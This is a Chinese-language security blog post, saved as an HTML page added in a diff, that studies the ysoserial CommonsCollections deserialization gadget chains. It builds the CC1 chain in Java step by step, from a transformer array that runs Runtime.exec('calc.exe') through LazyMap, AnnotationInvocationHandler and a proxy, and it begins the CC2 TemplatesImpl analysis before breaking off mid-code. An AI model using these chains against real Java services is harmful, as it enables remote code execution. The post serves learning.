@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Java Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CommonsCollections系列算是最经典的Java反序列化利用链了，本文基于ysoserial工具进行CC1-CC7链的学习其中CC1, CC3, CC5, CC6, CC7基于commons-collections 3.1版本，CC2, CC4基于commons-collections4 4.0版本 CommonsCollections1jdk1.8无法触发，构造链过程参考https:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ysoserial利用链学习 —— CommonsCollections">
+<meta property="og:url" content="http://example.com/2022/11/28/CC/index.html">
+<meta property="og:site_name" content="Mxy&#39;s Blog">
+<meta property="og:description" content="CommonsCollections系列算是最经典的Java反序列化利用链了，本文基于ysoserial工具进行CC1-CC7链的学习其中CC1, CC3, CC5, CC6, CC7基于commons-collections 3.1版本，CC2, CC4基于commons-collections4 4.0版本 CommonsCollections1jdk1.8无法触发，构造链过程参考https:">
+<meta property="og:locale">
+<meta property="og:image" content="c:\Users\13685\AppData\Roaming\Typora\typora-user-images\image-20221223190536044.png">
+<meta property="og:image" content="c:\Users\13685\AppData\Roaming\Typora\typora-user-images\image-20221223211939441.png">
+<meta property="article:published_time" content="2022-11-28T15:42:21.000Z">
+<meta property="article:modified_time" content="2023-07-31T16:18:04.441Z">
+<meta property="article:author" content="me0wxy">
+<meta property="article:tag" content="Java Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\13685\AppData\Roaming\Typora\typora-user-images\image-20221223190536044.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/11/28/CC/"/>
+
+
+
+
+
+  <title>Ysoserial利用链学习 —— CommonsCollections | Mxy's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mxy's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/28/CC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mxy's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Ysoserial利用链学习 —— CommonsCollections</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-28T23:42:21+08:00">
+                2022-11-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>CommonsCollections系列算是最经典的Java反序列化利用链了，本文基于ysoserial工具进行CC1-CC7链的学习<br>其中CC1, CC3, CC5, CC6, CC7基于commons-collections 3.1版本，CC2, CC4基于commons-collections4 4.0版本</p>
+<h4 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h4><p>jdk1.8无法触发，构造链过程参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/349838623%E5%92%8Chttps://www.anquanke.com/post/id/230788">https://zhuanlan.zhihu.com/p/349838623和https://www.anquanke.com/post/id/230788</a><br>链的命令执行核心是Transformer类的两个实现类（ChainedTransformer和InvokerTransformer）</p>
+<h5 id="知识点整理"><a href="#知识点整理" class="headerlink" title="知识点整理"></a>知识点整理</h5><ul>
+<li><p>类与反射</p>
+<blockquote>
+<p>在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性，并且能改变它的属性（即使是private的）。</p>
+<p>允许程序在运行时取得任何一个已知名称的class的内部信息，包括包括其modifiers(修饰符)，fields(属性)，methods(方法)等，并可于运行时改变fields内容或调用methods</p>
+<p>Java程序在运行时，Java运行时系统一直对所有的对象进行运行时类型标识。这项信息记录每个对象所属的类。虚拟机通常使用运行时类型信息选准正确方法去执行，用来保存这些类型信息的类是Class类。Class类封装一个对象和接口运行时的状态，当装载类时，Class类型的对象自动创建。</p>
+<p>可以通过三种方法获取java.lang.Class对象：</p>
+<p>Class str &#x3D; String.class; </p>
+<p>Class str &#x3D; <strong>new</strong> <strong>String</strong>().getClass(); </p>
+<p>Class str &#x3D; Class.forName(“java.lang.String”);</p>
+</blockquote>
+</li>
+<li><p>基于接口的多态</p>
+</li>
+<li><p>JDK动态代理</p>
+</li>
+<li><p>AnnotationInvocationHandler 做类与代理类</p>
+</li>
+</ul>
+<h5 id="命令执行点：Transformer"><a href="#命令执行点：Transformer" class="headerlink" title="命令执行点：Transformer"></a>命令执行点：Transformer</h5><p>InvokerTransformer类的构造方法和transform方法如下，利用反射机制进行指定方法的调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而ChainedTransformer类则能对一系列transformer进行连续的transform调用，且上一个调用的结果将会传给下一个transformer作为参数，形成链式执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">       object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>故在构造链时采用如下方式（这里的ConstantTransformer可视为返回参数本身）<br>等价为Runtime.getMethod(‘getRuntime’).invoke(null).exec(‘calc.exe’), 即Runtime.getRuntime().exec(‘calc.exe’)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">    	String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>前两个transformer等价为如下调用：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method aa = (Method) Runtime.class.getClass().getMethod(&quot;getMethod&quot;,new Class[] &#123;String.class, Class[].class &#125;).invoke(Runtime.class,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h5><p>下一步就是寻找如何触发chainedTransformer.transform()的调用<br>这里是利用LazyMap的get函数，继续构造如下链（令map为空HashMap，即可触发transform）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<p>LazyMap.get()可以在AnnotationInvocationHandler.invoke()中调用：<br>（其实类里其他方法也有get，这个大概就涉及到利用链构造的问题了，不是所有调用都好用的）<br>这步构造与ysoserial里实现不同（<strong>TODO 后续分析ysoserial的实现</strong>）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">				...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直观的构造方法</span></span><br><span class="line"><span class="comment">// 需要注意的是AnnotationInvocationHandler的构造方法是default限定符，所以需要外包无法直接访问。</span></span><br><span class="line"><span class="comment">// 这里将构造方法设置为public属性，在创建实例的时候将lazyMap添加在构造方法参数中即可。</span></span><br><span class="line"><span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">secondInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br></pre></td></tr></table></figure>
+
+<p>下一步是Map(Proxy).entrySet() -&gt; AnnotationInvocationHandler.invoke()，通过代理类触发invoke：</p>
+<p><code>JDK代理的主要函数为Proxy.newProxyInstance, 通过向该函数传递ClassLoader，interfaces，和重写invoke方法的InvocationHandler实现类即可实现代理。JDK代理是基于接口的，因为在本身在实现的时候是继承实现的，由于继承是单继承所以只能依靠接口。代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。</code></p>
+<p>entrySet() 和 python 里的 dict.items() 差不多</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        testMap.getClass().getClassLoader(),</span><br><span class="line">        testMap.getClass().getInterfaces(),</span><br><span class="line">        secondInvocationHandler</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>外面再来一层AnnotationInvocationHandler.readObject()（这里就成功接上了反序列化调用），需要构造另一个AnnotationInvocationHandler对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, evilMap);</span><br></pre></td></tr></table></figure>
+
+<p>最终得到如下的调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">        Map(Proxy).entrySet()</span><br><span class="line">            AnnotationInvocationHandler.invoke()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                           Method.invoke()</span><br><span class="line">                               Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                           Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<h4 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h4><p>本链基于commons-collections4 4.0版本</p>
+<h5 id="知识点整理-1"><a href="#知识点整理-1" class="headerlink" title="知识点整理"></a>知识点整理</h5><ul>
+<li><p>JAVAssist ( JAVA Programming ASSISTant )  机制</p>
+<blockquote>
+<p>允许开发者自由的在一个已经编译好的类中添加新的方法，或者是修改已有的方法。</p>
+<p>简单理解：java反射机制可以动态的获取和修改对象中的<strong>成员变量</strong>，Javassist则可以动态的获取和修改对象中的<strong>方法</strong>。</p>
+<p>CtClass( compile-time class , 编译时类信息 ) 是一个 Class 文件在代码中的抽象表现形式</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="命令执行点：JAVAssist插入恶意字节码"><a href="#命令执行点：JAVAssist插入恶意字节码" class="headerlink" title="命令执行点：JAVAssist插入恶意字节码"></a>命令执行点：JAVAssist插入恶意字节码</h5><p>本链中执行命令的方式与1不同，利用到了JAVAssist机制，修改类字节码插入恶意命令：</p>
+<blockquote>
+<p>Javassist可以将类加载成字节码格式并能对其中的方法进行修改，那么这就很符合序列化的特征（指的是将类加载成字符串格式），因为这样就可以把这个序列化后的字符串给其他类的变量赋值了，如果那个类有将这个变量中的字节码给实例化成对象，那么就会触发其中的static的方法。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>
+
+<p>分析ysoserial的Gadgets.createTemplatesImpl()实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	...</span><br><span class="line">       <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">   &#125;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br></pre></td></tr></table></figure>
+
+<p>这个templates是TemplatesImpl类型的对象（这里用反射思路方便后续的field赋值），利用defineTransletClasses和getTransletInstance两个方法，分别完成从字节码加载类定义和获取类实例的操作。该类的superClass必须是AbstractTranslet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">     <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">         AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">             <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span 